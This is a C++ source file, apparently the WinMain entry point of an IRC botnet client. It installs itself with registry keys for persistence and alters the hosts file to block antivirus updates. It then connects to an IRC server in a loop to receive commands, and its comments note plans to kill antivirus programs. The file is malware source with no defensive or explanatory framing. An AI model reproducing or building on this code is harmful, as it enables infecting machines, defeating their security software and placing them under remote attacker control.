#include "../Inc/SBX.h"
#include "../Inc/config.h"
#include "../Inc/Defines.h"
#include "../Inc/CStr.h"
#include "../Inc/AVUpdates.h"

CBot *Main;

INT WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, INT nShowCmd)
{
	xGuard;
	Main = new CBot();

	// Main Code start
	SetupConfig();

	// Set install destination and copy to it
	// Register registry keys
	Main->SetDest(filename);

	// Set a nick to connect
	Main->IRC->SetNick(NICK_TYPE, NICK_LEN);

	// Disable AV updates
	ChangeHostFile();

	while (true)
	{
		// Wait for internet connection to be ready
		while (!Main->IRC->CanCon())
			Sleep(60000);

		// Try to connect to the irc server
		if (!Main->IRC->Connect(server, serverport))
		{
			Sleep(2000);
			continue;
		}

		// Identify to the server
		if (!Main->IRC->Identify(serverpass))
		{
			Sleep(2000);
			continue;
		}

		// Receive and handle messages
		while (Main->IRC->Recv())
		{
			// Kill av's here
			// Check reg keys
			// Check bakup
			Sleep(10);
		}
	}
	// Main Code end

	delete Main;
	xUnguard("WinMain");
	return 0;
}